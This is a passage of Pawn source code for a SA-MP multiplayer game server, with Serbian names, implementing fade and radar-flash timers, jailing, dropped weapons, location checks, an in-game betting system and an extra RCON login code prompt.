	if( F_Count[ playerid ] == 40 ) return PlayerTextDrawBoxColor( playerid, Fading[ playerid ], 0x000000B1 );
	if( F_Count[ playerid ] == 41 ) return PlayerTextDrawBoxColor( playerid, Fading[ playerid ], 0x000000AA );
	if( F_Count[ playerid ] == 42 ) return PlayerTextDrawBoxColor( playerid, Fading[ playerid ], 0x000000A1 );
	if( F_Count[ playerid ] == 43 ) return PlayerTextDrawBoxColor( playerid, Fading[ playerid ], 0x0000009A );
	if( F_Count[ playerid ] == 44 ) return PlayerTextDrawBoxColor( playerid, Fading[ playerid ], 0x00000090 );
	if( F_Count[ playerid ] == 45 ) return PlayerTextDrawBoxColor( playerid, Fading[ playerid ], 0x0000008A );
	if( F_Count[ playerid ] == 46 ) return PlayerTextDrawBoxColor( playerid, Fading[ playerid ], 0x00000080 );
	if( F_Count[ playerid ] == 47 ) return PlayerTextDrawBoxColor( playerid, Fading[ playerid ], 0x0000007A );
	if( F_Count[ playerid ] == 48 ) return PlayerTextDrawBoxColor( playerid, Fading[ playerid ], 0x00000070 );
	if( F_Count[ playerid ] == 49 ) return PlayerTextDrawBoxColor( playerid, Fading[ playerid ], 0x0000006A );
	if( F_Count[ playerid ] == 50 ) return PlayerTextDrawBoxColor( playerid, Fading[ playerid ], 0x00000060 );
	if( F_Count[ playerid ] == 51 ) return PlayerTextDrawBoxColor( playerid, Fading[ playerid ], 0x0000005A );
	if( F_Count[ playerid ] == 52 ) return PlayerTextDrawBoxColor( playerid, Fading[ playerid ], 0x00000050 );
	if( F_Count[ playerid ] == 53 ) return PlayerTextDrawBoxColor( playerid, Fading[ playerid ], 0x0000004A );
	if( F_Count[ playerid ] == 54 ) return PlayerTextDrawBoxColor( playerid, Fading[ playerid ], 0x00000040 );
	if( F_Count[ playerid ] == 55 ) return PlayerTextDrawBoxColor( playerid, Fading[ playerid ], 0x0000003A );
	if( F_Count[ playerid ] == 56 ) return PlayerTextDrawBoxColor( playerid, Fading[ playerid ], 0x00000030 );
	if( F_Count[ playerid ] == 57 ) return PlayerTextDrawBoxColor( playerid, Fading[ playerid ], 0x0000002A );
	if( F_Count[ playerid ] == 58 ) return PlayerTextDrawBoxColor( playerid, Fading[ playerid ], 0x00000020 );
	if( F_Count[ playerid ] == 59 ) return PlayerTextDrawBoxColor( playerid, Fading[ playerid ], 0x0000001A );
	if( F_Count[ playerid ] == 60 ) return PlayerTextDrawBoxColor( playerid, Fading[ playerid ], 0x00000010 );
	if( F_Count[ playerid ] == 61 ) return PlayerTextDrawBoxColor( playerid, Fading[ playerid ], 0x0000000A );
	if( F_Count[ playerid ] == 62 ) return PlayerTextDrawHide( playerid, Fading[ playerid ] ), F_Count[ playerid ] = 0, KillTimer( Timer_Fading[ playerid ] );

	return true;
}

FadeFromBlack( playerid ) {

	if( F_Count[ playerid ] >= 32 ) return false;

    Timer_Fading[ playerid ] = SetTimerEx( "Black_Fading", 50, true, "i", playerid );
	PlayerTextDrawShow( playerid, Fading[ playerid ] );
	PlayerTextDrawBoxColor( playerid, Fading[ playerid ], 0x000000FF );
	F_Count[ playerid ] = 32;
	return true;
}

//------------------------------------------------------------------------------

forward RemoveRadarPictured( playerid );
public RemoveRadarPictured( playerid ) {

	alreadyPictured[ playerid ] = false;
	return 1;
}

stock RadarColor( playerid ) {

	if( Radar_Count[ playerid ] >= 32 ) return false;

    Timer_Radar[ playerid ] = SetTimerEx( "Radar_Color", 10, true, "i", playerid );
	PlayerTextDrawShow( playerid, RadarCol[ playerid ] );
	PlayerTextDrawBoxColor( playerid, RadarCol[ playerid ], 0xFF0000FF );
	Radar_Count[ playerid ] = 32;
	return true;
}

forward Radar_Color( playerid );
public Radar_Color( playerid ) {

	Radar_Count[ playerid ]++;

	PlayerTextDrawHide( playerid, RadarCol[ playerid ] );
	PlayerTextDrawShow( playerid, RadarCol[ playerid ] );

	if( Radar_Count[ playerid ] == 1 ) return PlayerTextDrawBoxColor( playerid, RadarCol[ playerid ], 0xFF00000A );
	if( Radar_Count[ playerid ] == 2 ) return PlayerTextDrawBoxColor( playerid, RadarCol[ playerid ], 0xFF000010 );
	if( Radar_Count[ playerid ] == 3 ) return PlayerTextDrawBoxColor( playerid, RadarCol[ playerid ], 0xFF00001A );
	if( Radar_Count[ playerid ] == 4 ) return PlayerTextDrawBoxColor( playerid, RadarCol[ playerid ], 0xFF000020 );
	if( Radar_Count[ playerid ] == 5 ) return PlayerTextDrawBoxColor( playerid, RadarCol[ playerid ], 0xFF00002A );
	if( Radar_Count[ playerid ] == 6 ) return PlayerTextDrawBoxColor( playerid, RadarCol[ playerid ], 0xFF000030 );
	if( Radar_Count[ playerid ] == 7 ) return PlayerTextDrawBoxColor( playerid, RadarCol[ playerid ], 0xFF00003A );
	if( Radar_Count[ playerid ] == 8 ) return PlayerTextDrawBoxColor( playerid, RadarCol[ playerid ], 0xFF000040 );
	if( Radar_Count[ playerid ] == 9 ) return PlayerTextDrawBoxColor( playerid, RadarCol[ playerid ], 0xFF00004A );
	if( Radar_Count[ playerid ] == 10 ) return PlayerTextDrawBoxColor( playerid, RadarCol[ playerid ], 0xFF000050 );
	if( Radar_Count[ playerid ] == 11 ) return PlayerTextDrawBoxColor( playerid, RadarCol[ playerid ], 0xFF00005A );
	if( Radar_Count[ playerid ] == 12 ) return PlayerTextDrawBoxColor( playerid, RadarCol[ playerid ], 0xFF000060 );
	if( Radar_Count[ playerid ] == 13 ) return PlayerTextDrawBoxColor( playerid, RadarCol[ playerid ], 0xFF00006A );
	if( Radar_Count[ playerid ] == 14 ) return PlayerTextDrawBoxColor( playerid, RadarCol[ playerid ], 0xFF000070 );
	if( Radar_Count[ playerid ] == 15 ) return PlayerTextDrawBoxColor( playerid, RadarCol[ playerid ], 0xFF00007A );
	if( Radar_Count[ playerid ] == 16 ) return PlayerTextDrawBoxColor( playerid, RadarCol[ playerid ], 0xFF000080 );
	if( Radar_Count[ playerid ] == 17 ) return PlayerTextDrawBoxColor( playerid, RadarCol[ playerid ], 0xFF00008A );
	if( Radar_Count[ playerid ] == 18 ) return PlayerTextDrawBoxColor( playerid, RadarCol[ playerid ], 0xFF000090 );
	if( Radar_Count[ playerid ] == 19 ) return PlayerTextDrawBoxColor( playerid, RadarCol[ playerid ], 0xFF00009A );
	if( Radar_Count[ playerid ] == 20 ) return PlayerTextDrawBoxColor( playerid, RadarCol[ playerid ], 0xFF0000A1 );
	if( Radar_Count[ playerid ] == 21 ) return PlayerTextDrawBoxColor( playerid, RadarCol[ playerid ], 0xFF0000AA );
	if( Radar_Count[ playerid ] == 22 ) return PlayerTextDrawBoxColor( playerid, RadarCol[ playerid ], 0xFF0000B1 );
	if( Radar_Count[ playerid ] == 23 ) return PlayerTextDrawBoxColor( playerid, RadarCol[ playerid ], 0xFF0000BB );
	if( Radar_Count[ playerid ] == 24 ) return PlayerTextDrawBoxColor( playerid, RadarCol[ playerid ], 0xFF0000C1 );
	if( Radar_Count[ playerid ] == 25 ) return PlayerTextDrawBoxColor( playerid, RadarCol[ playerid ], 0xFF0000CC );
	if( Radar_Count[ playerid ] == 26 ) return PlayerTextDrawBoxColor( playerid, RadarCol[ playerid ], 0xFF0000D1 );
	if( Radar_Count[ playerid ] == 27 ) return PlayerTextDrawBoxColor( playerid, RadarCol[ playerid ], 0xFF0000DD );
	if( Radar_Count[ playerid ] == 28 ) return PlayerTextDrawBoxColor( playerid, RadarCol[ playerid ], 0xFF0000E1 );
	if( Radar_Count[ playerid ] == 29 ) return PlayerTextDrawBoxColor( playerid, RadarCol[ playerid ], 0xFF0000EE );
	if( Radar_Count[ playerid ] == 30 ) return PlayerTextDrawBoxColor( playerid, RadarCol[ playerid ], 0xFF0000F1 );
	if( Radar_Count[ playerid ] == 31 ) return PlayerTextDrawBoxColor( playerid, RadarCol[ playerid ], 0xFF0000FF );

    if( Radar_Count[ playerid ] == 32 ) return PlayerTextDrawBoxColor( playerid, RadarCol[ playerid ], 0xFF0000F1 );
	if( Radar_Count[ playerid ] == 33 ) return PlayerTextDrawBoxColor( playerid, RadarCol[ playerid ], 0xFF0000EE );
	if( Radar_Count[ playerid ] == 34 ) return PlayerTextDrawBoxColor( playerid, RadarCol[ playerid ], 0xFF0000E1 );
	if( Radar_Count[ playerid ] == 35 ) return PlayerTextDrawBoxColor( playerid, RadarCol[ playerid ], 0xFF0000DD );
	if( Radar_Count[ playerid ] == 36 ) return PlayerTextDrawBoxColor( playerid, RadarCol[ playerid ], 0xFF0000D1 );
	if( Radar_Count[ playerid ] == 37 ) return PlayerTextDrawBoxColor( playerid, RadarCol[ playerid ], 0xFF0000CC );
	if( Radar_Count[ playerid ] == 38 ) return PlayerTextDrawBoxColor( playerid, RadarCol[ playerid ], 0xFF0000C1 );
	if( Radar_Count[ playerid ] == 39 ) return PlayerTextDrawBoxColor( playerid, RadarCol[ playerid ], 0xFF0000BB );
	if( Radar_Count[ playerid ] == 40 ) return PlayerTextDrawBoxColor( playerid, RadarCol[ playerid ], 0xFF0000B1 );
	if( Radar_Count[ playerid ] == 41 ) return PlayerTextDrawBoxColor( playerid, RadarCol[ playerid ], 0xFF0000AA );
	if( Radar_Count[ playerid ] == 42 ) return PlayerTextDrawBoxColor( playerid, RadarCol[ playerid ], 0xFF0000A1 );
	if( Radar_Count[ playerid ] == 43 ) return PlayerTextDrawBoxColor( playerid, RadarCol[ playerid ], 0xFF00009A );
	if( Radar_Count[ playerid ] == 44 ) return PlayerTextDrawBoxColor( playerid, RadarCol[ playerid ], 0xFF000090 );
	if( Radar_Count[ playerid ] == 45 ) return PlayerTextDrawBoxColor( playerid, RadarCol[ playerid ], 0xFF00008A );
	if( Radar_Count[ playerid ] == 46 ) return PlayerTextDrawBoxColor( playerid, RadarCol[ playerid ], 0xFF000080 );
	if( Radar_Count[ playerid ] == 47 ) return PlayerTextDrawBoxColor( playerid, RadarCol[ playerid ], 0xFF00007A );
	if( Radar_Count[ playerid ] == 48 ) return PlayerTextDrawBoxColor( playerid, RadarCol[ playerid ], 0xFF000070 );
	if( Radar_Count[ playerid ] == 49 ) return PlayerTextDrawBoxColor( playerid, RadarCol[ playerid ], 0xFF00006A );
	if( Radar_Count[ playerid ] == 50 ) return PlayerTextDrawBoxColor( playerid, RadarCol[ playerid ], 0xFF000060 );
	if( Radar_Count[ playerid ] == 51 ) return PlayerTextDrawBoxColor( playerid, RadarCol[ playerid ], 0xFF00005A );
	if( Radar_Count[ playerid ] == 52 ) return PlayerTextDrawBoxColor( playerid, RadarCol[ playerid ], 0xFF000050 );
	if( Radar_Count[ playerid ] == 53 ) return PlayerTextDrawBoxColor( playerid, RadarCol[ playerid ], 0xFF00004A );
	if( Radar_Count[ playerid ] == 54 ) return PlayerTextDrawBoxColor( playerid, RadarCol[ playerid ], 0xFF000040 );
	if( Radar_Count[ playerid ] == 55 ) return PlayerTextDrawBoxColor( playerid, RadarCol[ playerid ], 0xFF00003A );
	if( Radar_Count[ playerid ] == 56 ) return PlayerTextDrawBoxColor( playerid, RadarCol[ playerid ], 0xFF000030 );
	if( Radar_Count[ playerid ] == 57 ) return PlayerTextDrawBoxColor( playerid, RadarCol[ playerid ], 0xFF00002A );
	if( Radar_Count[ playerid ] == 58 ) return PlayerTextDrawBoxColor( playerid, RadarCol[ playerid ], 0xFF000020 );
	if( Radar_Count[ playerid ] == 59 ) return PlayerTextDrawBoxColor( playerid, RadarCol[ playerid ], 0xFF00001A );
	if( Radar_Count[ playerid ] == 60 ) return PlayerTextDrawBoxColor( playerid, RadarCol[ playerid ], 0xFF000010 );
	if( Radar_Count[ playerid ] == 61 ) return PlayerTextDrawBoxColor( playerid, RadarCol[ playerid ], 0xFF00000A );
	if( Radar_Count[ playerid ] == 62 ) return PlayerTextDrawHide( playerid, RadarCol[ playerid ] ), Radar_Count[ playerid ] = 0, Novi_KillTimer( Timer_Radar[ playerid ] );

	return true;
}
//------------------------------------------------------------------------------
stock JailPlayer( id, time ) {

	ResetAllWeapons( id );
	PlayerInfo[ id ][ xZatvor ] = OBICAN_ZATVOR;
	PlayerInfo[ id ][ xZatvorVreme ] = time;
	ClearAnimations( id );
	PlayerCP[ id ] = 0;
	if( IsPlayerAttachedObjectSlotUsed( id, OBJECT_SLOT_RHAND ) ) RemovePlayerAttachedObject( id, OBJECT_SLOT_RHAND );
	SetPlayerSpecialAction( id, SPECIAL_ACTION_NONE );
	PlayerCuffed[ id ] = 0;

	new rand = random( sizeof( RandomZatvor ) );
	PortajIgraca( id, RandomZatvor[ rand ][ 0 ], RandomZatvor[ rand ][ 1 ],RandomZatvor[ rand ][ 2 ] );
	PlayerInfo[ id ][ xWanted ] = 0;
    SetPlayerWorldBounds(id, -1398.697143, -1472.672607, -1443.334228, -1605.534057);
	Novi_SetPlayerWantedLevel( id, PlayerInfo[ id ][ xWanted ] );
	strmid( ZlocinInfo[ id ][ zPrijavio ], "Nema", 0, strlen("Nema"), 255 );
	strmid( ZlocinInfo[ id ][ zPocinio ], "Nema", 0, strlen("Nema"), 255 );
	strmid( ZlocinInfo[ id ][ zZlocin ], "Nema", 0, strlen("Nema"), 255 );
 	GameTextForPlayer( id, "Ucitavanje ...", 1000, 4 );
	SetTimerEx( "SlobodnoSada", 6000, false, "i", id );
	SetCameraBehindPlayer( id ); SetPlayerInterior( id, 0 );
	SetPlayerVirtualWorld( id, 0 );
	TogglePlayerControllable( id, 0 );
	SavePlayer( id );
}
//------------------------------------------------------------------------------
stock randomString(strDest[], strLen = 10)
{
	while(strLen--)
		strDest[strLen] = random(2) ? (random(26) + (random(2) ? 'a' : 'A')) : (random(10) + '0');
}
//------------------------------------------------------------------------------
stock CreateDroppedGun( GunID, GunAmmo, Float:gPosX, Float:gPosY, Float:gPosZ ) {

    if(GunID == 9 
        || GunID == 16 
        || GunID == 26 
        || GunID == 27 
        || GunID == 35 
        || GunID == 36 
        || GunID == 37 
        || GunID == 38 
        || GunID == 39 
        || GunID == 40 ) return 1;

    for( new a = 0; a < MAX_GOBJ; a++ ) {
        if( dGunData[ a ][ ObjPos ][ 0 ] == 0.0 ) {
            dGunData[ a ][ ObjData ][ 0 ] = GunID;
			dGunData[ a ][ ObjData ][ 1 ] = GunAmmo;
			dGunData[ a ][ ObjPos ][ 0 ] = gPosX;
			dGunData[ a ][ ObjPos ][ 1 ] = gPosY;
			dGunData[ a ][ ObjPos ][ 2 ] = gPosZ;
			dGunData[ a ][ gObjID ] = CreateDynamicObject( WeaponInfos[ GunID ][ wModel ], dGunData[ a ][ ObjPos ][ 0 ], dGunData[ a ][ ObjPos ][ 1 ], dGunData[ a ][ ObjPos ][ 2 ]-1, 93.7, 120.0, random(360) );
            new string[128];
            new gunName[32];
            GetWeaponName(GunID,gunName,sizeof(gunName));
            format(string, sizeof(string), "Da pokupite %s sa %d metkova kucajte\n/pickupgun", gunName, GunAmmo);
            gunLabel[a] = CreateDynamic3DTextLabel(string, SRVBOJA1, gPosX, gPosY, gPosZ, 30.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, STREAMER_3D_TEXT_LABEL_SD, -1, 0);
            return 1;
		}
    }
	return 1;
}
//------------------------------------------------------------------------------
stock Novi_KillTimer( timerid ) {
	if( timerid == -1 ) return 1;
	return KillTimer( timerid );
}
//------------------------------------------------------------------------------
stock IsPlayerInArea(playerid, Float:minx, Float:miny, Float:maxx, Float:maxy) {
	new Float:Poz[ 3 ];
	GetPlayerPos(playerid, Poz[0], Poz[1], Poz[2]);
	if(Poz[0] > minx && Poz[0] < maxx && Poz[1] > miny && Poz[1] < maxy) return true;
	return false;
}
//------------------------------------------------------------------------------
new OneSeatVehicles[ 38 ] = {

    425, 430, 432, 441, 446, 448, 452, 453,
	454, 464, 465, 472, 473, 476, 481, 484,
	485, 486, 493, 501, 509, 510, 519, 520,
	530, 531, 532, 539, 553, 564, 568, 571,
	572, 574, 583, 592, 594, 595
};
stock IsSeatAvailable( vehicleid, seat)
{
	new carmodel = GetVehicleModel( vehicleid);
	for (new i = 0; i < sizeof( OneSeatVehicles ); i++ )
	{
	    if( carmodel == OneSeatVehicles[i] ) return 0;
	}
	foreach(Player, i)
	{
	    if(GetPlayerVehicleID(i) == vehicleid && GetPlayerVehicleSeat(i) == seat) return 0;
	}
	return 1;
}
//
stock Javno3( playerid ) {

    if(IsPlayerConnected( playerid ) )
	{
		if(IsPlayerInRangeOfPoint(playerid, 10,1505.9548,-1741.5792,13.5469) || IsPlayerInRangeOfPoint(playerid, 10,1504.6154,-1741.4963,13.5469) || IsPlayerInRangeOfPoint(playerid, 10,1497.7278,-1733.2307,13.3828) || IsPlayerInRangeOfPoint(playerid, 10,1491.7355,-1738.8771,14.1983) || IsPlayerInRangeOfPoint(playerid, 10,1480.0619,-1741.7356,13.6287) || IsPlayerInRangeOfPoint(playerid, 10,1471.7213,-1740.6451,14.3646))
		{
  			return 1;
		}
	}
	return 0;
}

stock Javno4(playerid)
{
    if(IsPlayerConnected(playerid))
	{
		if(IsPlayerInRangeOfPoint(playerid, 10,1458.7819,-1739.5323,13.9193) || IsPlayerInRangeOfPoint(playerid, 10,1451.9343,-1732.9948,14.2465) || IsPlayerInRangeOfPoint(playerid, 10,1455.6887,-1728.3517,14.0456) || IsPlayerInRangeOfPoint(playerid, 10,1470.7139,-1752.2955,15.4453) || IsPlayerInRangeOfPoint(playerid, 10,1478.5802,-1754.8750,17.4498) || IsPlayerInRangeOfPoint(playerid, 10,1490.0334,-1755.7047,17.4401))
		{
  			return 1;
		}
	}
	return 0;
}

stock Javno5(playerid)
{
    if(IsPlayerConnected(playerid))
	{
		if(IsPlayerInRangeOfPoint(playerid, 10,1483.5298,-1762.2010,18.7289) || IsPlayerInRangeOfPoint(playerid, 10,1475.8184,-1767.5063,18.7958) || IsPlayerInRangeOfPoint(playerid, 10,1224.2733,-930.6243,42.5903) || IsPlayerInRangeOfPoint(playerid, 10,1232.1556,-929.4727,42.5212) || IsPlayerInRangeOfPoint(playerid, 10,1218.4210,-931.0319,42.9727) || IsPlayerInRangeOfPoint(playerid, 10,1209.4436,-926.8596,42.9230))
		{
  			return 1;
		}
	}
	return 0;
}

stock Javno6(playerid)
{
    if(IsPlayerConnected(playerid))
	{
		if(IsPlayerInRangeOfPoint(playerid, 10,1205.9155,-920.4095,43.0673) || IsPlayerInRangeOfPoint(playerid, 10,1195.8317,-921.3834,43.8945) || IsPlayerInRangeOfPoint(playerid, 10,1181.4392,-915.1285,43.2192) || IsPlayerInRangeOfPoint(playerid, 10,1177.5984,-899.8451,44.1480) || IsPlayerInRangeOfPoint(playerid, 10,1180.8157,-887.0159,43.4167) || IsPlayerInRangeOfPoint(playerid, 10,1190.9819,-883.4169,43.2069))
		{
  			return 1;
		}
	}
	return 0;
}

stock Javno7(playerid)
{
    if(IsPlayerConnected(playerid))
	{
		if(IsPlayerInRangeOfPoint(playerid, 10,1205.1240,-881.5010,42.9346) || IsPlayerInRangeOfPoint(playerid, 10,1217.4341,-882.3506,42.9045) || IsPlayerInRangeOfPoint(playerid, 10,1223.5906,-892.5105,43.4221) || IsPlayerInRangeOfPoint(playerid, 10,1226.6726,-911.0240,42.9017))
		{
  			return 1;
		}
	}
	return 0;
}

stock Javno8(playerid)
{
    if(IsPlayerConnected(playerid))
	{
		if(IsPlayerInRangeOfPoint(playerid, 40,1218.4386,-1334.5829,13.4835) || IsPlayerInRangeOfPoint(playerid, 10,1219.6810,-932.0195,42.6316) || IsPlayerInRangeOfPoint(playerid, 10,1481.5367,-1732.5997,13.3828) || IsPlayerInRangeOfPoint(playerid, 10,1544.8290,-2324.2332,13.5547) || IsPlayerInRangeOfPoint(playerid, 10,1198.5538,-1325.6200,13.3984))
		{
  			return 1;
		}
	}
	return 0;
}
//------------------------------------------------------------------------------
stock randomEx(min,max) {
	return (min+random(max));
}

stock randomExx(const iMin, const iMax) {
	return random(iMax - iMin) + iMin;
}

stock IzvuciRezultateKladionica( ) {

    new par1[ 10 ], par2[ 10 ];

    for( new i = 0; i < 10; i++ ) {

        par1[ i ] = Parovi[ i ][ parID ][ 0 ];
		par2[ i ] = Parovi[ i ][ parID ][ 1 ];

		if( bettingInfo[ par1[ i ] ][ teamStrength ] >  bettingInfo[ par2[ i ] ][ teamStrength ] ) {

			new rand = random( 10 );
			switch( rand ) {

			    case 0..5: {

			        new rez = random( 4 );
				    Parovi[ i ][ Rezultat ][ 0 ] = rez+(1+random( 2 ));
				    Parovi[ i ][ Rezultat ][ 1 ] = rez;
				    Parovi[ i ][ Rezultat ][ 2 ] = 1;
				    StariParovi[ i ][ Kvota ] = Parovi[ i ][ Kvota ][ 0 ];
			    }
				case 6: {

					new rez = random( 4 );
				    Parovi[ i ][ Rezultat ][ 0 ] = rez;
				    Parovi[ i ][ Rezultat ][ 1 ] = rez;
				    Parovi[ i ][ Rezultat ][ 2 ] = 2;
				    StariParovi[ i ][ Kvota ] = Parovi[ i ][ Kvota ][ 2 ];
				}
			    case 7..9: {

			        new rez = random( 4 );
				    Parovi[ i ][ Rezultat ][ 0 ] = rez;
				    Parovi[ i ][ Rezultat ][ 1 ] = rez+(1+random( 2 ));
				    Parovi[ i ][ Rezultat ][ 2 ] = 3;
				    StariParovi[ i ][ Kvota ] = Parovi[ i ][ Kvota ][ 1 ];
			    }

			}
		}
		else if( bettingInfo[ par1[ i ] ][ teamStrength ] ==  bettingInfo[ par2[ i ] ][ teamStrength ] ) {

		    new rand = random( 10 );
			switch( rand ) {

			    case 0..5: {

                    new rez = random( 4 );
				    Parovi[ i ][ Rezultat ][ 0 ] = rez;
				    Parovi[ i ][ Rezultat ][ 1 ] = rez;
				    Parovi[ i ][ Rezultat ][ 2 ] = 2;
				    StariParovi[ i ][ Kvota ] = Parovi[ i ][ Kvota ][ 2 ];
			    }
				case 6..7: {

					new rez = random( 4 );
				    Parovi[ i ][ Rezultat ][ 0 ] = rez;
				    Parovi[ i ][ Rezultat ][ 1 ] = rez+(1+random( 2 ));
				    Parovi[ i ][ Rezultat ][ 2 ] = 3;
				    StariParovi[ i ][ Kvota ] = Parovi[ i ][ Kvota ][ 1 ];
				}
			    case 8..9: {

			        new rez = random( 4 );
				    Parovi[ i ][ Rezultat ][ 0 ] = rez+(1+random( 2 ));
				    Parovi[ i ][ Rezultat ][ 1 ] = rez;
				    Parovi[ i ][ Rezultat ][ 2 ] = 1;
				    StariParovi[ i ][ Kvota ] = Parovi[ i ][ Kvota ][ 0 ];
			    }

			}
		}
		else if( bettingInfo[ par2[ i ] ][ teamStrength ] >  bettingInfo[ par1[ i ] ][ teamStrength ] ) {

			new rand = random( 10 );
			switch( rand ) {

			    case 0..5: {

			        new rez = random( 4 );
				    Parovi[ i ][ Rezultat ][ 0 ] = rez;
				    Parovi[ i ][ Rezultat ][ 1 ] = rez+(1+random( 2 ));
				    Parovi[ i ][ Rezultat ][ 2 ] = 3;
				    StariParovi[ i ][ Kvota ] = Parovi[ i ][ Kvota ][ 1 ];
			    }
				case 6: {

					new rez = random( 4 );
				    Parovi[ i ][ Rezultat ][ 0 ] = rez;
				    Parovi[ i ][ Rezultat ][ 1 ] = rez;
				    Parovi[ i ][ Rezultat ][ 2 ] = 2;
				    StariParovi[ i ][ Kvota ] = Parovi[ i ][ Kvota ][ 2 ];
				}
			    case 7..9: {

			        new rez = random( 4 );
				    Parovi[ i ][ Rezultat ][ 0 ] = rez+(1+random( 2 ));
				    Parovi[ i ][ Rezultat ][ 1 ] = rez;
				    Parovi[ i ][ Rezultat ][ 2 ] = 1;
				    StariParovi[ i ][ Kvota ] = Parovi[ i ][ Kvota ][ 0 ];
			    }
			}
		}


		new hour, minute, second, day, year, month;
		getdate( year, month, day );
		gettimeEx( hour, minute, second ); 
		FixHour( hour );
		hour = shifthour;

        StariParovi[ i ][ Rezultat ][ 0 ] = Parovi[ i ][ Rezultat ][ 0 ];
        StariParovi[ i ][ Rezultat ][ 1 ] = Parovi[ i ][ Rezultat ][ 1 ];
        StariParovi[ i ][ parID ][ 0 ] = par1[ i ];
        StariParovi[ i ][ parID ][ 1 ] = par2[ i ];
        
        new staar[ 32 ];
		format( staar, sizeof( staar ), "%d.%d.%d %02d:30", day, month, year, hour-1 );
        strmid( StariParovi[ i ][ HourPobeda ], staar, 0, strlen( staar ), 32 );
        
        SaveStareParove( );
        
		//SendClientMessageEx( playerid, -1, "%s %d : %d %s ", bettingInfo[ par1[ i ] ][ teamName ], Parovi[ i ][ Rezultat ][ 0 ], Parovi[ i ][ Rezultat ][ 1 ], bettingInfo[ par2[ i ] ][ teamName ] );
	}
	return (true);
}

stock PostaviParoveKladionica( ) {

		new par1[ 10 ], par2[ 10 ], razlika[ 10 ], Float:ki1[ 10 ], Float:ki2[ 10 ], Float:iks[ 10 ];

		NapraviParove( ); NapraviParove2( );

		for( new i = 0; i < 10; i++ ) {

			par1[ i ] = IzabraniParovi1[ i ];
			par2[ i ] = IzabraniParovi2[ i ];

			razlika[ i ] = bettingInfo[ par1[ i ] ][ teamStrength ] - bettingInfo[ par2[ i ] ][ teamStrength ];

			if( razlika[ i ] == -9 ) ki1[ i ] = 4.8, ki2[ i ] = 1.2, iks[ i ] = 4.0;
			else if( razlika[ i ] == -8 ) ki1[ i ] = 4.6, ki2[ i ] = 1.4, iks[ i ] = 3.8;
			else if( razlika[ i ] == -7 ) ki1[ i ] = 4.4, ki2[ i ] = 1.6, iks[ i ] = 3.6;
			else if( razlika[ i ] == -6 ) ki1[ i ] = 4.2, ki2[ i ] = 1.8, iks[ i ] = 3.4;
			else if( razlika[ i ] == -5 ) ki1[ i ] = 4.0, ki2[ i ] = 2.0, iks[ i ] = 3.2;
			else if( razlika[ i ] == -4 ) ki1[ i ] = 3.8, ki2[ i ] = 2.2, iks[ i ] = 3.0;
			else if( razlika[ i ] == -3 ) ki1[ i ] = 3.6, ki2[ i ] = 2.4, iks[ i ] = 2.8;
			else if( razlika[ i ] == -2 ) ki1[ i ] = 3.4, ki2[ i ] = 2.6, iks[ i ] = 2.6;
		    else if( razlika[ i ] == -1 ) ki1[ i ] = 3.2, ki2[ i ] = 2.8, iks[ i ] = 2.4;
			else if( razlika[ i ] == 0 ) ki1[ i ] = 3.0, ki2[ i ] = 3.0, iks[ i ] = 3.0;
			else if( razlika[ i ] == 1 ) ki1[ i ] = 2.8, ki2[ i ] = 3.2, iks[ i ] = 2.4;
			else if( razlika[ i ] == 2 ) ki1[ i ] = 2.6, ki2[ i ] = 3.4, iks[ i ] = 2.6;
			else if( razlika[ i ] == 3 ) ki1[ i ] = 2.4, ki2[ i ] = 3.6, iks[ i ] = 2.8;
			else if( razlika[ i ] == 4 ) ki1[ i ] = 2.2, ki2[ i ] = 3.8, iks[ i ] = 3.0;
			else if( razlika[ i ] == 5 ) ki1[ i ] = 2.0, ki2[ i ] = 4.0, iks[ i ] = 3.2;
			else if( razlika[ i ] == 6 ) ki1[ i ] = 1.8, ki2[ i ] = 4.2, iks[ i ] = 3.4;
			else if( razlika[ i ] == 7 ) ki1[ i ] = 1.6, ki2[ i ] = 4.4, iks[ i ] = 3.6;
			else if( razlika[ i ] == 8 ) ki1[ i ] = 1.4, ki2[ i ] = 4.6, iks[ i ] = 3.8;
			else if( razlika[ i ] == 9 ) ki1[ i ] = 1.2, ki2[ i ] = 4.8, iks[ i ] = 4.0;

	        Parovi[ i ][ parID ][ 0 ] = par1[ i ];
	        Parovi[ i ][ parID ][ 1 ] = par2[ i ];
			Parovi[ i ][ Kvota ][ 0 ] = ki1[ i ];
			Parovi[ i ][ Kvota ][ 1 ] = ki2[ i ];
			Parovi[ i ][ Kvota ][ 2 ] = iks[ i ];
			Parovi[ i ][ Rezultat ][ 0 ] = 0;
			Parovi[ i ][ Rezultat ][ 1 ] = 0;
			Parovi[ i ][ Rezultat ][ 2 ] = 0;

		}
    	return (true);
}

stock NapraviParove( ) {

	for( new i = 0; i < 10; i++ ) {
	
		IzabraniParovi1[ i ] = Random_Number_Generator( i, 46 );
	}
	return (true);
}

stock NapraviParove2( ) {

	for( new i = 0; i < 10; i++ ) {
	
		IzabraniParovi2[ i ] = Random_Number_Generator_2( i, 46 );
	}
	return (true);
}

stock Random_Number_Generator_2(curid,max)
{
  	new Num_Var_Index;

    Num_Var_Index = random(max);

    for( new i = 0; i < curid; i++ ) {
    
		if( IzabraniParovi2[ i ] == Num_Var_Index || IzabraniParovi1[ i ] == Num_Var_Index ) return Random_Number_Generator_2(curid,max);
    }

    return Num_Var_Index;
}

stock Random_Number_Generator(curid,max)
{
  	new Num_Var_Index;

    Num_Var_Index = random(max);

    for( new i = 0; i < curid; i++ ) {
    
		if( IzabraniParovi1[ i ] == Num_Var_Index || IzabraniParovi2[ i ] == Num_Var_Index ) return Random_Number_Generator(curid,max);
    }

    return Num_Var_Index;
}

public OnRconLoginAttempt( ip[], password[], success ) {

    new ip2[ 32 ];
	if( success ) {
	
   	    foreach( Player, i ) {
   	    
   	        GetPlayerIp( i, ip2, sizeof( ip2 ) );
     		if( !strcmp( ip, ip2, true ) ) {
     		
				SPD( i, dialog_RCONPROVERA, DSP, D_NASLOV, "Da bi mogli da koristite RCON admina, morate da ukucate sigurnosni RCON kodn\nMolimo vas da kod unesete ispod!", D_ODABERI, D_ODUSTANI );
			}
		}
	}
    return true;
}
forward DosadasnjiRekord();
public DosadasnjiRekord()
{
	new strFromFile[24], arrCoords[6][5], File: file = fopen("rekord.txt", io_read);
	if (file)
	{
		fread(file, strFromFile);
		razdvoji(strFromFile, arrCoords, ',');
		postojecirekord = strval(arrCoords[0]);
		fclose(file);
	}
	return 1;
}
forward SacuvajRekord();
public SacuvajRekord()
{
	new coordsstring[24];
	format(coordsstring, sizeof(coordsstring), "%d", postojecirekord);
	new File: file = fopen("rekord.txt", io_write);
